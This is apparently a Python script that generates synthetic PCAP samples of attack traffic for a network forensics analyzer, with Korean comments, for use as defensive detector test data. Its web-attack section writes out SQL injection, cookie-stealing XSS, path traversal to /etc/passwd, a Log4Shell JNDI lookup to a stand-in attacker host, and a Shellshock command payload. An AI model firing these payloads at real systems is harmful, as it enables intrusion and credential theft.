"""공격 시나리오별 합성 PCAP 샘플 생성.

실행:  python tools/make_samples.py
결과:  samples/*.pcap  (전부 사설 IP 대역의 가짜 트래픽, 실제 멀웨어 없음)
"""
from __future__ import annotations

import base64
import os
import random
import string
import sys

sys.path.insert(0, os.path.join(os.path.dirname(__file__), ".."))

from live_pcap_forensics_analyzer import craft
from live_pcap_forensics_analyzer.pcapio import write_pcap

SAMPLES = os.path.join(os.path.dirname(__file__), "..", "samples")
BASE_TS = 1760227200.0  # 2025-10-12 00:00:00 UTC 근처의 고정 기준시각
rng = random.Random(42)  # 재현 가능한 샘플


def _rand_label(n: int) -> str:
    return "".join(rng.choices(string.ascii_lowercase + string.digits, k=n))


def make_portscan() -> list:
    pkts = []
    t = BASE_TS
    attacker, victim = "10.0.0.66", "10.0.0.10"
    for i, port in enumerate(rng.sample(range(1, 10000), 40)):
        craft.syn_probe(pkts, t + i * 0.01, attacker, victim, 50000 + i, port)
    # 호스트 스윕: 같은 포트로 여러 호스트
    for i in range(15):
        craft.syn_probe(pkts, t + 2 + i * 0.05, attacker, f"10.0.0.{100 + i}", 51000 + i, 445)
    return pkts


def make_ftp_bruteforce() -> list:
    pkts = []
    t = BASE_TS
    attacker, server = "10.0.0.66", "10.0.0.21"
    for i in range(10):
        flow = craft.TcpFlow(pkts, attacker, 52000 + i, server, 21)
        flow.handshake(t)
        flow.send(t + 0.01, b"220 FTP Server ready\r\n", c2s=False)
        flow.send(t + 0.02, b"USER admin\r\n")
        flow.send(t + 0.03, b"331 Password required\r\n", c2s=False)
        pw = f"pass{i:03d}".encode()
        flow.send(t + 0.04, b"PASS " + pw + b"\r\n")
        if i < 9:
            flow.send(t + 0.05, b"530 Login incorrect\r\n", c2s=False)
            flow.reset(t + 0.06)
        else:  # 마지막 시도 성공 -> 평문 자격증명 노출까지 재현
            flow.send(t + 0.05, b"230 User admin logged in\r\n", c2s=False)
            flow.close(t + 0.06)
        t += 1.5
    return pkts


def make_web_attacks() -> list:
    pkts = []
    t = BASE_TS
    attacker, server = "192.168.1.50", "192.168.1.80"

    def http_get(ts, port, uri, status=b"404 Not Found", body=b"denied",
                 extra_headers=b""):
        flow = craft.TcpFlow(pkts, attacker, port, server, 80)
        flow.handshake(ts)
        req = (b"GET " + uri + b" HTTP/1.1\r\nHost: shop.example.local\r\n" +
               extra_headers + b"\r\n")
        flow.send(ts + 0.01, req)
        resp = (b"HTTP/1.1 " + status + b"\r\nContent-Type: text/html\r\n"
                b"Content-Length: " + str(len(body)).encode() + b"\r\n\r\n" + body)
        flow.send(ts + 0.02, resp, c2s=False)
        flow.close(ts + 0.03)

    http_get(t, 53001, b"/item.php?id=1'%20OR%20'1'='1")
    http_get(t + 1, 53002, b"/item.php?id=1%20UNION%20SELECT%20username,password%20FROM%20users")
    http_get(t + 2, 53003, b"/search?q=%3Cscript%3Ealert(document.cookie)%3C/script%3E")
    http_get(t + 3, 53004, b"/download?file=../../../../etc/passwd")
    http_get(t + 4, 53005, b"/login", status=b"200 OK",
             extra_headers=b"User-Agent: ${jndi:ldap://evil.example.local/a}\r\n")
    http_get(t + 5, 53006, b"/cgi-bin/status",
             extra_headers=b"User-Agent: () { :;}; /bin/bash -c 'cat /etc/passwd'\r\n")

    # HTTP Basic 평문 자격증명
    cred = base64.b64encode(b"sol:hunter2").decode()
    http_get(t + 6, 53007, b"/admin", status=b"200 OK",
             extra_headers=f"Authorization: Basic {cred}\r\n".encode())

    # 폼 로그인 (POST 본문 평문 비밀번호) + 인증 브루트포스(401 반복)
    for i in range(9):
        flow = craft.TcpFlow(pkts, attacker, 53100 + i, server, 80)
        ts = t + 7 + i * 0.3
        flow.handshake(ts)
        body = f"username=admin&password=try{i:02d}".encode()
        req = (b"POST /login HTTP/1.1\r\nHost: shop.example.local\r\n"
               b"Content-Type: application/x-www-form-urlencoded\r\n"
               b"Content-Length: " + str(len(body)).encode() + b"\r\n\r\n" + body)
        flow.send(ts + 0.01, req)
        flow.send(ts + 0.02, b"HTTP/1.1 401 Unauthorized\r\nContent-Length: 0\r\n\r\n", c2s=False)
        flow.close(ts + 0.03)
    return pkts


def make_dns_tunnel() -> list:
    pkts = []
    t = BASE_TS
    victim, resolver = "10.0.0.33", "10.0.0.53"
    # 터널링: 데이터가 인코딩된 긴 서브도메인 질의 연속
    for i in range(30):
        sub = _rand_label(45)
        name = f"{sub}.tunnel.example-c2.net"
        craft.udp_packet(pkts, t + i * 0.4, victim, resolver, 40000 + i, 53,
                         craft.dns_query(name, qtype=16, txid=0x2000 + i))
        craft.udp_packet(pkts, t + i * 0.4 + 0.02, resolver, victim, 53, 40000 + i,
                         craft.dns_response(name, qtype=16, txid=0x2000 + i))
    # DGA: 랜덤 도메인 NXDOMAIN 연속
    for i in range(25):
        name = f"{_rand_label(14)}.com"
        craft.udp_packet(pkts, t + 15 + i * 0.2, victim, resolver, 41000 + i, 53,
                         craft.dns_query(name, txid=0x3000 + i))
        craft.udp_packet(pkts, t + 15 + i * 0.2 + 0.02, resolver, victim, 53, 41000 + i,
                         craft.dns_response(name, rcode=3, txid=0x3000 + i))
    # 평범한 질의도 섞는다 (오탐 대조군)
    for i, name in enumerate(["www.naver.com", "www.google.com", "mail.daum.net"]):
        craft.udp_packet(pkts, t + 25 + i, victim, resolver, 42000 + i, 53,
                         craft.dns_query(name, txid=0x4000 + i))
        craft.udp_packet(pkts, t + 25 + i + 0.02, resolver, victim, 53, 42000 + i,
                         craft.dns_response(name, answer_ip="93.184.216.34", txid=0x4000 + i))
    return pkts


def make_beacon() -> list:
    pkts = []
    t = BASE_TS
    bot, c2 = "10.0.0.77", "203.0.113.99"
    for i in range(12):
        ts = t + i * 30 + rng.uniform(-0.5, 0.5)  # 30초 간격 + 미세 지터
        flow = craft.TcpFlow(pkts, bot, 54000 + i, c2, 443)
        flow.handshake(ts)
        flow.send(ts + 0.05, bytes(rng.randbytes(60)))       # 암호화된 체크인 흉내
        flow.send(ts + 0.1, bytes(rng.randbytes(120)), c2s=False)
        flow.close(ts + 0.2)
    return pkts


def make_arpspoof() -> list:
    pkts = []
    t = BASE_TS
    gateway_ip = "192.168.0.1"
    real_mac = "aa:bb:cc:00:00:01"
    attacker_mac = "de:ad:be:ef:00:66"
    victim_mac = "aa:bb:cc:00:00:33"
    victim_ip = "192.168.0.33"
    # 정상 게이트웨이 응답
    pkts.append((t, craft.arp_reply(real_mac, gateway_ip, victim_mac, victim_ip)))
    # 공격자가 게이트웨이 IP를 자기 MAC으로 반복 주장 (포이즈닝)
    for i in range(8):
        pkts.append((t + 1 + i * 0.5,
                     craft.arp_reply(attacker_mac, gateway_ip, victim_mac, victim_ip)))
    return pkts


def make_mixed() -> list:
    """시연용 종합 샘플: 모든 시나리오를 한 캡처에."""
    pkts = []
    for maker in (make_portscan, make_ftp_bruteforce, make_web_attacks,
                  make_dns_tunnel, make_beacon, make_arpspoof):
        pkts.extend(maker())
    pkts.sort(key=lambda x: x[0])
    return pkts


def main() -> None:
    os.makedirs(SAMPLES, exist_ok=True)
    scenarios = {
        "01_portscan.pcap": make_portscan,
        "02_ftp_bruteforce.pcap": make_ftp_bruteforce,
        "03_web_attacks.pcap": make_web_attacks,
        "04_dns_tunnel.pcap": make_dns_tunnel,
        "05_beacon.pcap": make_beacon,
        "06_arpspoof.pcap": make_arpspoof,
        "99_mixed.pcap": make_mixed,
    }
    for name, maker in scenarios.items():
        pkts = maker()
        path = os.path.join(SAMPLES, name)
        write_pcap(path, pkts)
        print(f"{name}: {len(pkts)} packets")


if __name__ == "__main__":
    main()
